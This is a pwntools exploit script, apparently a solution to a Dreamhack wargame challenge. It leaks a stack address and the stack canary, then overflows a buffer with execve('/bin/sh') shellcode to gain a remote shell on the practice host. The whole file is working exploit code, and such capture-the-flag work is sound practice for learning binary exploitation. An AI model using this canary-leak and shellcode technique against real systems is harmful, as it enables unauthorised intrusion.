from pwn import *
exe = ELF("./r2s_patched")
r = remote("host3.dreamhack.games", 13430)
# r = process("./r2s_patched")
# gdb.attach(r, gdbscript='''
#            b* main+159
#            c
#            ''')
input()
r.recvuntil(b"buf: ")
leak_stack = int(r.recvline(keepends=False).decode(), 16)
log.info("leak stack: " + hex(leak_stack))

payload1 = b"a" * 89
r.sendafter(b"Input: ", payload1)
r.recvuntil(b"a" * 88)
leak = u64(r.recv(8)) - 0x61
log.info("leak canary " + hex(leak))

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    ''', arch='amd64'
)
payload2 = shellcode
payload2 = payload2.ljust(88, b"a")
payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
r.sendlineafter(b"Input: ", payload2)

r.interactive()
